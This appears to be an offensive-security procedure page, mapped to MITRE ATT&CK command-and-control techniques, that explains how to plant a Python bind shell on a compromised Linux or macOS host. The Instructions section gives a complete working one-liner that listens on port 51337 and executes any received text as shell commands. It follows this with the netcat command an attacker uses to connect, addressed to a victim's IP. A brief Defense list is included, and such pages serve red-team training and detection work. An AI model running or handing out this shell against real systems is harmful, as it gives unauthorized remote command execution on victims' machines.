---
id: 7c2d31ad-dd87-4289-9cf1-ae289b9c6f77
type: procedure
name: Python-Bind-Shell
verified: true
submitted: false
created_at: '2023-04-06T03:56:08.779583+00:00'
updated_at: '2023-04-10T20:21:16.273209+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
techniques:
  - '[[techniques/Non-Standard Port|T1571 - Non-Standard Port]]'
  - >-
    [[techniques/Standard Application Layer Protocol|T1071 - Standard
    Application Layer Protocol]]
sub_techniques:
  - '[[sub-techniques/Web Protocols|T1071.001 - Web Protocols]]'
tags:
  - '[[tags/Bind Shell]]'
  - '[[tags/Python]]'
commands:
  - '[[commands/python-bind-shell-one-liner]]'
  - '[[commands/netcat-connect-bind-shell]]'
platforms:
  - Linux
  - macOS
tools: []
validated: true
---

# Python-Bind-Shell

## Summary

This procedure establishes a bind shell on a target machine using Python, allowing an attacker to connect remotely and execute commands interactively. It creates a TCP listener on a specified port, executes incoming commands via subprocess, and returns the output, providing command and control access without requiring additional binaries on the target.

## Description

A Python bind shell operates by running a script on the compromised target that binds a socket to a local IP (typically 0.0.0.0) and a chosen port, listening for incoming connections from the attacker's machine. Upon connection, the shell receives commands, executes them using Python's subprocess module, and relays the stdout and stderr back to the attacker. This technique is useful in post-exploitation scenarios where initial access has been gained (e.g., via RCE or file upload), and it leverages Python's standard library for cross-platform compatibility on Unix-like systems. The shell uses TCP as the protocol, which blends with normal traffic but can be tuned to non-standard ports to evade basic firewalls. Detection is challenging if the port is common (e.g., 80 or 443), but monitoring for unusual Python processes or network connections can reveal it. This procedure assumes Python 2 or 3 is installed on the target and requires network reachability from the attacker to the target's bind port.

## Requirements

1. Python 2 or 3 installed on the target machine
2. Network access from the attacker's machine to the target's IP and chosen port (e.g., no firewall blocking inbound TCP to port 51337)
3. Initial code execution capability on the target (e.g., via webshell, SSH, or RCE)
4. Netcat or equivalent listener tool on the attacker's machine

## Defense

- Implement host-based firewalls to block inbound connections on non-essential ports
- Monitor for Python processes spawning subprocesses with network activity using tools like Sysmon or auditd
- Enable application whitelisting to restrict Python execution or script imports
- Network segmentation to limit lateral movement and inspect outbound/inbound traffic for anomalous TCP connections

## Objectives

1. Establish a persistent command shell on the target for remote command execution
2. Maintain command and control access without installing additional malware
3. Exfiltrate command outputs and potentially escalate privileges through the shell

## Instructions

### Step 1: Deploy and Execute Bind Shell on Target

**Context**: This step sets up the bind listener on the target machine using a one-liner Python command, which executes the bind shell code inline. The listener binds to all interfaces (0.0.0.0) on port 51337, allowing connections from any IP. This assumes you have a way to inject and run the command on the target, such as through an existing shell or RCE vulnerability.

**Command** ([[commands/python-bind-shell-one-liner]]):
```bash
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",51337));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

> This command imports the socket and subprocess modules, creates a TCP socket, sets it to reuse addresses for quick rebinding, binds to port 51337, listens for one connection, and enters a loop to handle commands. If successful, the process will hang waiting for connections without visible output. Verify by checking if the Python process is running and listening on the port (e.g., via netstat on the target).

### Step 2: Connect to the Bind Shell from Attacker Machine

**Context**: Once the bind shell is listening on the target, connect to it from your attacker machine using netcat to establish the interactive shell session. Replace the target IP with the victim's actual IP address. This step completes the C2 channel, allowing command execution.

**Command** ([[commands/netcat-connect-bind-shell]]):
```bash
nc $_TARGET_IP 51337
```

> Upon connection, you should see a shell prompt or be able to type commands directly. Test with simple commands like 'whoami' or 'pwd' to confirm execution and output relay. If the connection fails, check firewall rules, port binding, or network reachability. The session remains open until disconnected or the target process is killed.
